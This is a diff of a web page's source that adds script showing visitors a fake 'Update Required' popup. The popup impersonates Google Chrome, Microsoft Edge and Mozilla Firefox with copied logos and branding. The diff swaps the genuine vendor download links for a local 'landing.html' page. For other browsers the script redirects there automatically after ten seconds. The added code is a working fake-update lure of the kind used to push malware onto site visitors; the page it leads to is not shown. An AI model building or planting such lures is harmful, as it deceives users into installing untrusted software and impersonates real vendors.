-color-fill-base-2:rgb(var(--color_37));--wst-color-fill-base-shade-1:rgb(var(--color_38));--wst-color-fill-base-shade-2:rgb(var(--color_39));--wst-color-fill-base-shade-3:rgb(var(--color_40));--wst-color-fill-accent-1:rgb(var(--color_41));--wst-color-fill-accent-2:rgb(var(--color_42));--wst-color-fill-accent-3:rgb(var(--color_43));--wst-color-fill-accent-4:rgb(var(--color_44));--wst-color-fill-background-primary:rgb(var(--color_11));--wst-color-fill-background-secondary:rgb(var(--color_12));--wst-color-text-primary:rgb(var(--color_15));--wst-color-text-secondary:rgb(var(--color_14));--wst-color-action:rgb(var(--color_18));--wst-color-disabled:rgb(var(--color_39));--wst-color-title:rgb(var(--color_45));--wst-color-subtitle:rgb(var(--color_46));--wst-color-line:rgb(var(--color_47));--wst-font-style-h2:var(--font_2);--wst-font-style-h3:var(--font_3);--wst-font-style-h4:var(--font_4);--wst-font-style-h5:var(--font_5);--wst-font-style-h6:var(--font_6);--wst-font-style-body-large:var(--font_7);--wst-font-style-body-medium:var(--font_8);--wst-font-style-body-small:var(--font_9);--wst-font-style-body-x-small:var(--font_10);--wst-color-custom-1:rgb(var(--color_13));--wst-color-custom-2:rgb(var(--color_16));--wst-color-custom-3:rgb(var(--color_17));--wst-color-custom-4:rgb(var(--color_19));--wst-color-custom-5:rgb(var(--color_20));--wst-color-custom-6:rgb(var(--color_21));--wst-color-custom-7:rgb(var(--color_22));--wst-color-custom-8:rgb(var(--color_23));--wst-color-custom-9:rgb(var(--color_24));--wst-color-custom-10:rgb(var(--color_25));--wst-color-custom-11:rgb(var(--color_26));--wst-color-custom-12:rgb(var(--color_27));--wst-color-custom-13:rgb(var(--color_28));--wst-color-custom-14:rgb(var(--color_29));--wst-color-custom-15:rgb(var(--color_30));--wst-color-custom-16:rgb(var(--color_31));--wst-color-custom-17:rgb(var(--color_32));--wst-color-custom-18:rgb(var(--color_33));--wst-color-custom-19:rgb(var(--color_34));--wst-color-custom-20:rgb(var(--color_35))}</style>
 
   <meta name="format-detection" content="telephone=no">
   <meta name="skype_toolbar" content="skype_toolbar_parser_compatible">
@@ -1117,8 +1289,7 @@ Program</span></span></span></span></span></span></span></span></span></h1></div
       // Extract the browser version
       let version = result.browser.version;
       let versionParts = version.split('.');
-      let latestUpdate = `${versionParts[0]}.${versionParts[1]}.${parseInt(versionParts[2]) + 1}`;
-
+      let latestUpdate = `${versionParts[0]}.${versionParts[1]}.${(parseInt(versionParts[2]) || 0) + 1}`;
       // Popup content based on browser
       let popupHtml = "";
       let popupClass = "";
@@ -1139,67 +1310,37 @@ Program</span></span></span></span></span></span></span></span></span></h1></div
       // Display browser version and latest update in the popup
       switch (result.browser.name) {
         case "Chrome":
+          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/2048px-Google_Chrome_icon_%28February_2022%29.svg.png";  
           popupHtml = `
-            <h1 class="chromeheader">Update Required</h1><br><p>Your Chrome version does not include the latest update and, therefore, futher attempts to access websites are denied. <br> <br> To continue using Chrome, please install the mandatory update to recieve the latest version of Google Chrome.</p> <br>
-            <p class="chromever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="${downloadLink}" class="download-link" target="_blank">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.</label><br><br><p>© 2025 Google LLC⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Privacy · Terms</p>`;
+            <img src="${logoUrl}" alt="Logo" /><h1 class="chromeheader">Update Required</h1><br><p>Your Chrome version does not include the latest update and, therefore, websites may not function as expected. <br> <br> To continue using Chrome, please install the mandatory update to recieve the latest version of Google Chrome.</p> <br>
+            <p class="chromever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="./landing.html" class="chrome-download-link">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Google Chrome better by automatically sending usage statistics and crash reports to Google.</label><br><br><p class="leftTXT">© 2O25 Google LLC</p><p class="rightTXT">Privacy · Terms</p>`;
           popupClass = "chrome";
-          downloadLink = "https://www.google.com/chrome/";
-          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/2048px-Google_Chrome_icon_%28February_2022%29.svg.png";
-          break;
-        case "Firefox":
-          popupHtml = `
-            <h1>Welcome to Firefox!</h1>
-            <p>Current Version: ${version}</p>
-            <p>Latest Update: ${latestUpdate}</p>
-            <p>Download Mozilla Firefox now.</p>`;
-          popupClass = "firefox";
-          downloadLink = "https://www.mozilla.org/en-US/firefox/new/";
-          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/d/d7/Mozilla_Firefox_logo_2017.png";
-          break;
-        case "Safari":
-          popupHtml = `
-            <h1>Welcome to Safari!</h1>
-            <p>Current Version: ${version}</p>
-            <p>Latest Update: ${latestUpdate}</p>
-            <p>Download the latest version of Safari for Mac.</p>`;
-          popupClass = "safari";
-          downloadLink = "https://www.apple.com/safari/";
-          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/d/d2/Safari_browser_logo.png";
           break;
         case "Microsoft Edge":
+          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Microsoft_Edge_logo_%282019%29.svg/1200px-Microsoft_Edge_logo_%282019%29.svg.png";
           popupHtml = `
-            <h1>Welcome to Edge!</h1>
-            <p>Current Version: ${version}</p>
-            <p>Latest Update: ${latestUpdate}</p>
-            <p>Download Microsoft Edge browser now.</p>`;
-          popupClass = "edge";
-          downloadLink = "https://www.microsoft.com/edge";
-          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/a/a3/Microsoft_Edge_logo_%282019%29.svg";
+            <div class="popupwrapper" id="popupwrapper"><div class="div" id="div"><img src="${logoUrl}" alt="Logo" /><h1 class="edgeheader">Update Required</h1><br><p>Your Edge version does not include the latest update and, therefore, websites may not function as expected. <br> <br> To continue using Edge, please install the mandatory update to recieve the latest version of Microsoft Edge.</p><br><p class="edgever">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="./landing.html" class="edge-download-link">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales">Help make Microsoft Edge better by automatically sending usage statistics and crash reports to Microsoft.</label><br><br><p class="leftTXT">© 2O25 Microsoft LLC</p><p class="rightTXT">Privacy · Terms</p></div><div class="imagedemo" id="imagedemo"><img class="edge-pic" id="edge-pic" src="https://i.ibb.co/FN36wMV/Untitled-design-2.png"></img></div></div>`;
+            popupClass = "edge";
           break;
-        case "Opera":
+        case "Firefox":
+          logoUrl = "https://blog.mozilla.org/design/files/2019/10/Fx-Browser-icon-fullColor.svg";
           popupHtml = `
-            <h1>Welcome to Opera!</h1>
-            <p>Current Version: ${version}</p>
-            <p>Latest Update: ${latestUpdate}</p>
-            <p>Get the Opera browser with unique features.</p>`;
-          popupClass = "opera";
-          downloadLink = "https://www.opera.com/download";
-          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/a/a7/Opera_2015_logo.svg";
+            <img src="${logoUrl}" alt="Logo" /><h1 class="firefoxheader">Update Required</h1><br><div class="center"><p class="shrinkage">Your Firefox version does not include the latest update and, therefore, websites may not function as expected. <br> <br> To continue using Firefox, please install the mandatory update to recieve the latest version of Mozilla Firefox.</p></div><br><p class="firefoxver">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><a href="./landing.html" class="firefox-download-link">Download Now</a><br><br><input checked="true" type="checkbox" id="scales" name="scales" checked /><label for="scales" class="check">Help make Mozilla Firefox better by automatically sending usage statistics and crash reports to Mozilla.</label><br><br><p class="leftTXT">© 2O25 Mozilla LLC</p><p class="rightTXT">Privacy · Terms</p>`;
+          popupClass = "firefox";
           break;
         default:
-          popupHtml = `
-            <h1>Unknown Browser</h1>
-            <p>Current Version: ${version}</p>
-            <p>Latest Update: ${latestUpdate}</p>
-            <p>Sorry, we couldn't detect your browser.</p>`;
-          popupClass = "chrome"; // Default to Chrome style
-          downloadLink = "https://www.google.com/chrome/"; // Default download link
-          logoUrl = "https://upload.wikimedia.org/wikipedia/commons/a/a7/Google_Chrome_icon_%282013-2019%29.png"; // Default logo
-          break;
-      }
+          popupHtml = 
+          `<h1 class="firefoxheader">Update Required</h1><br><div class="center"><p class="shrinkage">Your browser version does not include the latest update and, therefore, websites may not function as expected. <br> <br> To continue using your web browser, please install the mandatory update to recieve the latest version.</p></div><br><p class="firefoxver">Current Version: ${version} | Latest Update: ${latestUpdate}</p><br><br><p>You will be autmatically redirected to the download page momentarily.</p>`;
+          popupClass = "firefox";
+          downloadLink = "";
+          setTimeout(function() {
+                window.location.href = "./landing.html";
+            }, 10000);
+          break;    
+    }
 
       // Assign the popup HTML and class
-      popupContainer.innerHTML = `<img src="${logoUrl}" alt="Logo" />` + popupHtml;
+      popupContainer.innerHTML = popupHtml;
       popupContainer.classList.add(popupClass);
     }, 1500); // 1.5-second delay
   </script>
